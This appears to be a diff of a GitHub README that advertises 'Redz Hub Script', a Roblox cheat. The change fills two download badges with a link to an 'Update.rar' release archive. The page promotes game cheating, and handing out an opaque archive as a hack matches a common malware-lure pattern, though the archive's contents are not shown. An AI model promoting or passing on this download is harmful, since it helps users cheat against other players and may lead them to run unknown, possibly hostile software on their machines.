@@ -1,10 +1,10 @@
 # 🔥 **Redz Hub Script — The Ultimate All-in-One Hack for Roblox (2025 Edition)** 🚀  
-[![Download Redz Hub Script](https://img.shields.io/badge/Download-Redz_Hub_Script-red?style=for-the-badge&logo=download)]()  
+[![Download Redz Hub Script](https://img.shields.io/badge/Download-Redz_Hub_Script-red?style=for-the-badge&logo=download)](https://github.com/FildeROB/redz-hub-script/releases/download/Update/Update.rar)  
 
 ![redz](https://github.com/user-attachments/assets/b9128519-2a0f-4913-a5c8-b364175ec515)
 
 
-[![Download Redz Hub Script](https://img.shields.io/badge/Download-Redz_Hub_Script-red?style=for-the-badge&logo=download)]()  
+[![Download Redz Hub Script](https://img.shields.io/badge/Download-Redz_Hub_Script-red?style=for-the-badge&logo=download)](https://github.com/FildeROB/redz-hub-script/releases/download/Update/Update.rar)  
 
 ---
 
